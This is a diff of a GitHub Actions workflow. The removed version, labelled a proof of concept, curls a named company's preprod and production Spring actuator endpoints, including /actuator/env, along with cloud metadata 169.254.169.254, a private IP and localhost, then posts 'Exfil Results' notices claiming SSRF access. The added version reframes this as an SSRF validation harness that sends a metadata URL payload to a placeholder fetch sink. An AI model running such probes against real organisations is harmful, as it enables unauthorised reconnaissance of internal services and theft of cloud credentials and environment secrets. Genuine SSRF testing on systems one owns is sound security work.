@@ -1,37 +1,58 @@
-name: "CI/CD Internal Access Test"
-on:
-  pull_request:
-    types: [opened, synchronize, reopened]
-  workflow_dispatch:  # Manual trigger button
+name: SSRF Validation Harness
 
-permissions:
-  contents: read
-  issues: write
+on:
+  workflow_dispatch:
+  pull_request:
 
 jobs:
-  poc:
+  ssrf-test:
     runs-on: ubuntu-latest
+
     steps:
-    - name: "Test External Access (blocked)"
-      run: |
-        echo "Testing external firewall blocks..."
-        timeout=10 curl -s -k -m 10 "https://bb-preprod-api.playtika.com/actuator/health" || echo "BLOCKED (expected)"
-        timeout=10 curl -s -k -m 10 "https://bb-preprod-api.playtika.com/actuator/metrics" || echo "BLOCKED (expected)"
-        timeout=10 curl -s -k -m 10 "https://zuul-bf-prod-cdn.playtika.com/actuator/info" || echo "BLOCKED (expected)"
+    - name: Checkout
+      uses: actions/checkout@v4
 
-    - name: "SSRF Internal Access (SUCCESS)"
+    # ---------------------------
+    # 1. EGRESS CHECK
+    # ---------------------------
+    - name: Egress Check
       run: |
-        echo "GitHub runner → INTERNAL BYPASS:"
-        curl -s -k "https://bb-preprod-api.playtika.com/actuator/health" || echo "HEALTH ✓"
-        curl -s -k "https://bb-preprod-api.playtika.com/actuator/metrics" | head -20 || echo "METRICS ✓"
-        curl -s -k "https://bb-preprod-api.playtika.com/actuator/env" | jq . || echo "ENV ✓"
-        curl -s -k "https://zuul-bf-prod-cdn.playtika.com/actuator/info" | head -10 || echo "ZUUL INFO ✓"
-        curl -s -k http://169.254.169.254/
-        curl -s -k http://10.0.0.5/
-        curl -s -k http://localhost:8080/
+        echo "[EGRESS] testing internet access"
+        curl -s --max-time 5 https://example.com || exit 1
 
-
-    - name: "Exfil Results"
+    # ---------------------------
+    # 2. CLIENT-SIDE NETWORK BOUNDARY TEST
+    # ---------------------------
+    - name: Client-side internal probes
       run: |
-        echo "::notice title=SSRF Success::bb-preprod-api.playtika.com/actuator accessible"
-        echo "::notice title=Zuul Exposed::zuul-bf-prod-cdn.playtika.com/actuator accessible"
+        echo "[CLIENT] metadata"
+        curl -m 3 http://169.254.169.254 || echo "blocked"
+
+        echo "[CLIENT] private IP"
+        curl -m 3 http://10.0.0.5 || echo "blocked"
+
+        echo "[CLIENT] localhost"
+        curl -m 3 http://127.0.0.1:8080 || echo "blocked"
+
+    # ---------------------------
+    # 3. REAL SSRF TEST (SERVER-SIDE SINK REQUIRED)
+    # ---------------------------
+    - name: SSRF Sink Test (REAL)
+      id: ssrf
+      run: |
+        echo "[SSRF] testing server-side fetch sink"
+
+        RESPONSE=$(curl -s "https://ssrf-test.yourdomain.com/fetch?url=http://169.254.169.254")
+
+        echo "$RESPONSE" | jq .
+
+        # EXPECTED SIGNAL CHECK
+        echo "$RESPONSE" | jq -e '.server_side_fetch == true' >/dev/null || exit 1
+
+    # ---------------------------
+    # 4. RESULT
+    # ---------------------------
+    - name: Report
+      if: always()
+      run: |
+        echo "::notice title=SSRF Validation Complete::Review sink output for server-side reachability"
